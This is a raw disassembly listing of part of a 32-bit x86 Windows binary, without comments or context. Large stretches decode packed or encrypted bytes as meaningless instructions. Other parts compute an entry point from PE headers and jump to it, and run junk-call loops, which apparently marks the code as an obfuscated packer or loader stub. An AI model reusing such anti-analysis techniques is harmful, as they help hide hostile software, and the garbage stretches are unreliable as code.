  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x7f9b6e39],ecx
  4069de:	sahf   
  4069df:	push   0xffffffc2
  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	pusha  
  4069ea:	and    al,BYTE PTR [ebx+ebp*8]
  4069ed:	(bad)
  4069f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f1:	std    
  4069f2:	cmp    eax,0x7cda7101
  4069f7:	lahf   
  4069f8:	pop    edx
  4069f9:	mov    WORD PTR [ebp+ebp*1-0x142fb0ad],cs
  406a00:	mov    cl,0x5d
  406a02:	outs   dx,DWORD PTR ds:[esi]
  406a03:	scas   al,BYTE PTR es:[edi]
  406a04:	fucom  st(4)
  406a06:	mov    ds:0x12f4a90b,al
  406a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a0c:	cmp    DWORD PTR [eax+0x78b8f0a8],esi
  406a12:	and    al,0x3a
  406a14:	xchg   BYTE PTR es:[edx+0x1a],al
  406a18:	adc    dh,bl
  406a1a:	sbb    BYTE PTR [esi-0x9],ah
  406a1d:	sbb    esi,DWORD PTR [ebx-0x13]
  406a20:	lods   eax,DWORD PTR ds:[esi]
  406a21:	or     al,0x5a
  406a23:	cmp    dl,BYTE PTR [ecx+esi*1-0x6b]
  406a27:	dec    ecx
  406a28:	mov    esi,0x40dc959e
  406a2d:	int    0xd7
  406a2f:	pop    edx
  406a30:	jl     0x406a7b
  406a32:	aas    
  406a33:	xor    BYTE PTR [esi],0x75
  406a36:	add    ebx,DWORD PTR [ecx]
  406a38:	cmp    al,0x86
  406a3a:	inc    ebp
  406a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a3c:	mov    al,ds:0x6c92b2e
  406a41:	mov    bh,0xb5
  406a43:	(bad)  
  406a44:	dec    ebp
  406a45:	pop    DWORD PTR [ebx-0x2a70af98]
  406a4b:	jl     0x406a2b
  406a4d:	mov    ds:0x4337c608,eax
  406a52:	push   0x411a5287
  406a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a58:	(bad)  
  406a5a:	jl     0x406a4c
  406a5c:	mov    esp,0x5d6c0b97
  406a61:	mov    esp,0xf5ae4cca
  406a66:	stc    
  406a67:	fimul  WORD PTR [ebx-0x26]
  406a6a:	mov    cl,0xd1
  406a6c:	lods   eax,DWORD PTR ds:[esi]
  406a6d:	mov    bl,0x51
  406a6f:	jne    0x406a2f
  406a71:	mov    dl,0xb4
  406a73:	xor    eax,0xfab41eef
  406a78:	bound  ecx,QWORD PTR [edx]
  406a7a:	and    dl,BYTE PTR [eax]
  406a7c:	fsubr  DWORD PTR [eax+edx*8-0x3e]
  406a80:	jne    0x406a9a
  406a82:	add    al,0x24
  406a84:	(bad)  
  406a85:	lock dec eax
  406a87:	pushf  
  406a88:	stc    
  406a89:	jmp    0x406a1f
  406a8b:	jmp    0x68df:0x35789853
  406a92:	push   ebx
  406a93:	pop    es
  406a94:	mov    ch,BYTE PTR [eax-0x65eb3c92]
  406a9a:	or     edx,DWORD PTR [ecx-0x25]
  406a9d:	sar    cl,0xf3
  406aa0:	xlat   BYTE PTR ds:[ebx]
  406aa1:	mov    edi,0x9df5b624
  406aa6:	dec    ebp
  406aa7:	repz imul edx,edi,0xffffff8b
  406aab:	int    0x9e
  406aad:	test   al,0x37
  406aaf:	icebp  
  406ab0:	push   cs
  406ab1:	fwait
  406ab2:	push   edx
  406ab3:	sub    DWORD PTR [ebx-0x21a3b4f5],edx
  406ab9:	fstp   TBYTE PTR [esi-0x65dab6ac]
  406abf:	pop    edi
  406ac0:	jae    0x406ae6
  406ac2:	jp     0x406ab7
  406ac4:	cmp    DWORD PTR [ebx+0x1],ecx
  406ac7:	push   ss
  406ac8:	sbb    eax,0xd197cb34
  406acd:	pmaxsw mm0,QWORD PTR [esi]
  406ad0:	inc    esi
  406ad1:	imul   edx,DWORD PTR [ebx],0x17
  406ad4:	gs xchg ecx,eax
  406ad6:	pop    es
  406ad7:	cmc    
  406ad8:	pop    ds
  406ad9:	jecxz  0x406b53
  406adb:	push   0xb46edecb
  406ae0:	add    DWORD PTR [esi+0x6b9dee04],edi
  406ae6:	into   
  406ae7:	ins    BYTE PTR es:[edi],dx
  406ae8:	(bad)  
  406ae9:	cs push cs
  406aeb:	ror    ch,1
  406aed:	aam    0xee
  406aef:	dec    ebp
  406af0:	lock aaa 
  406af2:	icebp  
  406af3:	add    DWORD PTR [esi-0x200cbbc2],esp
  406af9:	sbb    ah,BYTE PTR [esi-0x6]
  406afc:	xchg   BYTE PTR [edi+0x1d37a2b4],al
  406b02:	and    edi,DWORD PTR [esi-0x3c4d1352]
  406b08:	adc    BYTE PTR [esi],bl
  406b0a:	and    dh,BYTE PTR [edx]
  406b0c:	test   BYTE PTR [eax],cl
  406b0e:	mov    dh,0x96
  406b10:	ja     0x406b34
  406b12:	jle    0x406aa7
  406b14:	repnz lock inc edi
  406b17:	rcr    BYTE PTR [ebx+ebx*8-0x18],cl
  406b1b:	and    BYTE PTR [esi+0x31],bl
  406b1e:	mov    bl,0xfd
  406b20:	(bad)  
  406b21:	xchg   esp,eax
  406b22:	sbb    al,0xf0
  406b24:	stc    
  406b25:	test   eax,0x60ae1add
  406b2a:	dec    esi
  406b2b:	(bad)  
  406b2c:	retf   
  406b2d:	jp     0x406ba8
  406b2f:	pop    es
  406b30:	cmp    edx,DWORD PTR [eax]
  406b32:	adc    ch,BYTE PTR [edi+0x60391c6c]
  406b38:	int    0xe4
  406b3a:	push   eax
  406b3b:	inc    ecx
  406b3c:	lahf   
  406b3d:	push   eax
  406b3e:	lods   al,BYTE PTR ds:[esi]
  406b3f:	jl     0x406ad8
  406b41:	and    DWORD PTR [edx],0xffffff82
  406b44:	stos   BYTE PTR es:[edi],al
  406b45:	cld    
  406b46:	xchg   esi,eax
  406b47:	mov    ecx,0x71fa1181
  406b4c:	mov    edx,DWORD PTR ds:0x7112a357
  406b52:	mov    edi,0x457cdec8
  406b57:	das    
  406b58:	retf   0xee10
  406b5b:	pop    edi
  406b5c:	fwait
  406b5d:	sbb    DWORD PTR [ecx+edi*8+0x462472e0],edi
  406b64:	out    0xdc,eax
  406b66:	xor    BYTE PTR [eax-0x7d],dh
  406b69:	xor    DWORD PTR [esi+ebp*2],edx
  406b6c:	in     al,0x50
  406b6e:	mov    es,WORD PTR [ecx-0x59bde9f2]
  406b74:	mov    eax,ds:0xc55eb985
  406b79:	add    ah,bl
  406b7b:	push   edx
  406b7c:	test   eax,0x389c5f0c
  406b81:	sbb    dh,BYTE PTR ds:[esp+edx*1+0x1fa26612]
  406b89:	repz shl cl,cl
  406b8c:	inc    ecx
  406b8d:	into   
  406b8e:	call   0xb9f9e6dc
  406b93:	and    eax,0xdf8b53c3
  406b98:	test   BYTE PTR [edx+edi*4+0x3707eedf],ch
  406b9f:	(bad)  
  406ba0:	xacquire xchg BYTE PTR [ebp-0x78],dh
  406ba4:	push   edi
  406ba5:	(bad)  
  406ba6:	lds    edx,FWORD PTR [eax]
  406ba8:	cdq    
  406ba9:	pop    ebx
  406baa:	sub    eax,edi
  406bac:	fidivr DWORD PTR [edi+0x14]
  406baf:	rcl    ch,cl
  406bb1:	push   eax
  406bb2:	mov    al,0x9f
  406bb4:	lea    ebp,[ebp+ebx*4+0x7240f1b4]
  406bbb:	inc    esp
  406bbc:	pop    eax
  406bbd:	jmp    0x7057abc5
  406bc2:	mul    DWORD PTR [esi]
  406bc4:	out    dx,eax
  406bc5:	xor    BYTE PTR [esi+eiz*2-0x11ac9dda],dh
  406bcc:	inc    esp
  406bcd:	or     DWORD PTR [ebx+edi*2-0x2f],ebx
  406bd1:	dec    esp
  406bd2:	fist   WORD PTR gs:[edi]
  406bd5:	push   eax
  406bd6:	outs   dx,BYTE PTR ds:[esi]
  406bd7:	fnstsw WORD PTR [edi+0x4e07cb09]
  406bdd:	jb     0x406b9e
  406bdf:	inc    eax
  406be0:	and    DWORD PTR [eax+0x627d2772],0xffffffe6
  406be7:	jl     0x406c40
  406be9:	and    eax,DWORD PTR [esi+0x48]
  406bec:	std    
  406bed:	adc    DWORD PTR [ebx],eax
  406bef:	pusha  
  406bf0:	lock out 0xa2,al
  406bf3:	jbe    0x406bc9
  406bf5:	jmp    0x241:0x3f934923
  406bfc:	cdq    
  406bfd:	pop    es
  406bfe:	add    DWORD PTR [ecx],edi
  406c00:	fldcw  WORD PTR [edi-0x53]
  406c03:	mov    WORD PTR [esi+0x72712624],ds
  406c09:	mov    eax,0x7ea86466
  406c0e:	mov    dh,0xdc
  406c10:	push   ds
  406c11:	shr    BYTE PTR ds:[ecx+ecx*4+0x54fa8339],0xde
  406c1a:	push   ebx
  406c1b:	add    dl,ch
  406c1d:	mov    ds:0xd8ee24d5,eax
  406c22:	mov    eax,ds:0x932683e8
  406c27:	sub    eax,DWORD PTR [edx+esi*8]
  406c2a:	rcl    BYTE PTR [ebp+0x45],cl
  406c2d:	lods   al,BYTE PTR ds:[esi]
  406c2e:	xchg   ebp,eax
  406c2f:	mov    dh,0x30
  406c31:	cmp    bl,BYTE PTR [esi]
  406c33:	mov    esi,0x8480e80a
  406c38:	jge    0x406c66
  406c3a:	in     al,dx
  406c3b:	mov    eax,ds:0x3a218eb3
  406c40:	xlat   BYTE PTR ds:[ebx]
  406c41:	xor    al,0xc9
  406c43:	cmp    eax,0x149a0d75
  406c48:	das    
  406c49:	aaa    
  406c4a:	je     0x406eec
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xae8c2bde
  406c81:	out    0x30,eax
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	jne    0x406cd5
  406c8d:	sub    al,0x3c
  406c8f:	mov    ch,BYTE PTR [eax]
  406c91:	sub    bl,0x75
  406c94:	add    ch,ch
  406c96:	(bad)  
  406c97:	repz (bad) 
  406c99:	push   eax
  406c9a:	pushf  
  406c9b:	cmp    bh,dh
  406c9d:	xor    DWORD PTR [edi],edi
  406c9f:	cmp    dl,BYTE PTR [edx-0x40]
  406ca2:	pop    ds
  406ca3:	or     DWORD PTR [ecx],edx
  406ca5:	(bad)  
  406ca6:	enter  0xe71b,0xa
  406caa:	jl     0x406c57
  406cac:	mov    cl,BYTE PTR [esi-0x34d751ac]
  406cb2:	ins    DWORD PTR es:[edi],dx
  406cb3:	jb     0x406c6c
  406cb5:	call   0x29d424d4
  406cba:	add    eax,0x81e8d340
  406cbf:	mov    ah,0x5c
  406cc1:	cmp    al,0xcf
  406cc4:	xchg   DWORD PTR [esi],eax
  406cc6:	xor    BYTE PTR [ebp+0x19],al
  406cc9:	xor    BYTE PTR [eax-0x24bac8d4],bl
  406ccf:	jl     0x406d45
  406cd1:	call   0x2936c35
  406cd6:	repnz sbb al,BYTE PTR [esi+0xa9559f1]
  406cdd:	rcl    DWORD PTR [ebp+0x434b3bb0],0x97
  406ce4:	jp     0x406c73
  406ce6:	pop    ebx
  406ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce8:	nop
  406ce9:	xlat   BYTE PTR ds:[ebx]
  406cea:	push   ebp
  406ceb:	lds    edi,FWORD PTR [eax+0x3b7a078d]
  406cf1:	retf   0x27f6
  406cf4:	js     0x406cc0
  406cf6:	jg     0x406cc9
  406cf8:	repz dec eax
  406cfa:	inc    ecx
  406cfb:	xchg   esi,eax
  406cfc:	out    0xe9,eax
  406cfe:	popa   
  406cff:	repz jae 0x406cd3
  406d02:	scas   al,BYTE PTR es:[edi]
  406d03:	inc    esi
  406d04:	clc    
  406d05:	push   ebp
  406d06:	outs   dx,DWORD PTR ds:[esi]
  406d07:	and    al,bh
  406d09:	arpl   WORD PTR [eax+0x37818a79],bp
  406d0f:	ins    BYTE PTR es:[edi],dx
  406d10:	add    eax,0xf7950216
  406d15:	out    0x74,eax
  406d17:	push   ebx
  406d18:	outs   dx,DWORD PTR ds:[esi]
  406d19:	cmp    ch,BYTE PTR [ecx]
  406d1b:	icebp  
  406d1c:	xor    al,0x45
  406d1e:	ds ds stc 
  406d21:	jae    0x406cee
  406d23:	adc    DWORD PTR [edi],ebp
  406d25:	lods   al,BYTE PTR ds:[esi]
  406d26:	mov    edx,0x44b155ab
  406d2b:	add    ah,ch
  406d2d:	cld    
  406d2e:	or     dh,al
  406d30:	cdq    
  406d31:	sti    
  406d32:	rcl    bl,cl
  406d34:	hlt    
  406d35:	int    0x31
  406d37:	jb     0x406db1
  406d39:	das    
  406d3a:	leave  
  406d3b:	ret    0x7633
  406d3e:	bswap  ebx
  406d40:	aas    
  406d41:	add    BYTE PTR [edx],dh
  406d43:	outs   dx,BYTE PTR ds:[esi]
  406d44:	ja     0x406d84
  406d46:	or     ebx,DWORD PTR [ebp-0x28dcabd4]
  406d4c:	fdiv   QWORD PTR [edi-0x391ed4a3]
  406d52:	sub    ah,BYTE PTR [edx+0x56]
  406d55:	push   edi
  406d56:	add    DWORD PTR [ebx-0x2246d59],ebx
  406d5c:	sar    dl,0xaf
  406d5f:	jmp    0xff433aad
  406d64:	dec    edx
  406d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d66:	sar    DWORD PTR [ecx],0x24
  406d69:	and    cl,BYTE PTR [ebp+0x2c]
  406d6c:	mov    dl,0x7a
  406d6e:	imul   dl
  406d70:	sbb    BYTE PTR [eax+0x1b],al
  406d73:	idiv   DWORD PTR [edx]
  406d75:	jl     0x406dbe
  406d77:	mov    al,ds:0x2c776e5f
  406d7c:	inc    edx
  406d7d:	push   esp
  406d7e:	aaa    
  406d7f:	pop    ebp
  406d80:	dec    ecx
  406d81:	ret    
  406d82:	imul   esp,DWORD PTR [esi],0x3a18a338
  406d88:	mov    bh,0xd8
  406d8a:	shl    BYTE PTR [esi+eax*4],0x2b
  406d8e:	aas    
  406d8f:	std    
  406d90:	addr16 mov esi,0xe779f9e9
  406d96:	jne    0x406dcd
  406d98:	mov    edi,0x3811a69a
  406d9d:	mov    esp,0xf58fd6a1
  406da2:	das    
  406da3:	sbb    BYTE PTR [edx+edx*1-0x7a4deaca],ch
  406daa:	sub    al,0xda
  406dac:	dec    esp
  406dad:	cs xchg edx,eax
  406daf:	sub    bl,cl
  406db1:	jne    0x406e01
  406db3:	push   DWORD PTR [ebx-0x7100dcb8]
  406db9:	mov    bl,0xf
  406dbb:	(bad)  
  406dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dbd:	leave  
  406dbe:	cmc    
  406dbf:	xor    DWORD PTR [eax+ecx*2+0x49],0xffffffb8
  406dc4:	xchg   BYTE PTR [ecx],ah
  406dc6:	lds    ebx,FWORD PTR [ebp+edx*1+0xd]
  406dca:	call   0x70a1:0x1429a94b
  406dd1:	sbb    eax,0x65a02b9e
  406dd6:	mov    BYTE PTR [edi+0x5c8a32c4],bh
  406ddc:	daa    
  406ddd:	mov    al,0x74
  406ddf:	std    
  406de0:	cli    
  406de1:	mov    DWORD PTR [edi+0x2ff85d0f],esi
  406de7:	and    BYTE PTR [esp+edi*1-0x1c31cf0c],al
  406dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406def:	(bad)  
  406df0:	outs   dx,DWORD PTR ds:[esi]
  406df1:	imul   esp,DWORD PTR [eax+eax*2-0x4f],0x67
  406df6:	js     0x406e29
  406df8:	neg    BYTE PTR ds:0x2fc9b01
  406dfe:	pop    edx
  406dff:	aas    
  406e00:	xor    al,0x60
  406e02:	mov    al,0x99
  406e04:	in     eax,dx
  406e05:	pop    edi
  406e06:	dec    bh
  406e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e09:	dec    esp
  406e0a:	fcomp  DWORD PTR [eax-0x635abac8]
  406e10:	and    eax,DWORD PTR [ecx+0x6e]
  406e13:	cld    
  406e14:	enter  0x4523,0x5e
  406e18:	and    eax,0x7fcf292f
  406e1d:	sahf   
  406e1e:	rol    DWORD PTR [ebx+0x26],1
  406e21:	js     0x406e52
  406e23:	aas    
  406e24:	outs   dx,BYTE PTR ds:[esi]
  406e25:	loope  0x406e49
  406e27:	jg     0x406e27
  406e29:	mov    ah,0x99
  406e2b:	mov    DWORD PTR [eax-0x61c8c7fe],edi
  406e31:	mov    esp,DWORD PTR [eax]
  406e33:	test   eax,0xecd03a0
  406e38:	mov    bh,0xbd
  406e3a:	retf   
  406e3b:	outs   dx,BYTE PTR ds:[esi]
  406e3c:	sbb    dh,ch
  406e3e:	xchg   edx,eax
  406e3f:	pop    eax
  406e40:	std    
  406e41:	mov    DWORD PTR [ebp+0x39],edi
  406e44:	pop    ds
  406e45:	test   BYTE PTR [edx],al
  406e47:	fucom  st(2)
  406e49:	pop    edi
  406e4a:	or     al,0x7c
  406e4c:	jae    0x406ddf
  406e4e:	push   edx
  406e4f:	daa    
  406e50:	mov    dh,0x42
  406e52:	inc    ebp
  406e53:	mov    ds:0xa060ed8b,al
  406e58:	jno    0x406e4e
  406e5a:	std    
  406e5b:	push   es
  406e5c:	xchg   ecx,eax
  406e5d:	icebp  
  406e5e:	outs   dx,BYTE PTR ds:[esi]
  406e5f:	push   0x41e6c547
  406e64:	sbb    al,0xe7
  406e66:	imul   eax,ebx,0xe2c799c
  406e6c:	dec    ebp
  406e6d:	in     eax,dx
  406e6e:	jl     0x406e1e
  406e70:	enter  0x9ab6,0xa3
  406e74:	mov    eax,0x62661cde
  406e79:	sahf   
  406e7a:	mov    eax,ds:0xb6ec266b
  406e7f:	pop    edi
  406e80:	sbb    DWORD PTR [ecx+0x2fe1b84d],edx
  406e86:	add    dl,cl
  406e88:	leave  
  406e89:	and    al,0x99
  406e8b:	loope  0x406ecf
  406e8d:	mov    eax,ds:0x195679ee
  406e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e93:	push   cs
  406e94:	aas    
  406e95:	pop    es
  406e96:	ror    DWORD PTR [edi],0x1f
  406e99:	inc    edi
  406e9a:	add    al,0x11
  406e9d:	sub    cl,0x57
  406ea0:	sbb    ebp,edi
  406ea2:	cmp    dl,bh
  406ea4:	and    BYTE PTR [eax],bh
  406ea6:	xchg   esp,eax
  406ea7:	or     DWORD PTR [esi-0x52],eax
  406eaa:	sbb    eax,0x5f3e35c0
  406eaf:	mov    eax,0xd4514287
  406eb4:	ja     0x406e71
  406eb6:	mov    ebx,0xdbb2a6ae
  406ebb:	imul   esi,esp,0xfc755985
  406ec1:	fst    QWORD PTR [edx]
  406ec3:	inc    ebx
  406ec4:	pop    ds
  406ec5:	jmp    0x406e4a
  406ec7:	sbb    dl,BYTE PTR cs:[ecx+0x5a23f136]
  406ece:	xor    esp,ebp
  406ed0:	inc    edx
  406ed1:	push   edi
  406ed2:	cmc    
  406ed3:	xchg   ebp,eax
  406ed4:	dec    eax
  406ed5:	imul   esp,ebp,0x830855c3
  406edb:	push   es
  406edc:	add    eax,0x47e8212f
  406ee1:	ss jg  0x406f0b
  406ee4:	repz inc ebx
  406ee6:	int    0x18
  406ee8:	push   ds
  406ee9:	xchg   esi,eax
  406eea:	mov    DWORD PTR [edx-0x75],0xc2c91045
  406ef1:	or     al,0x0
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
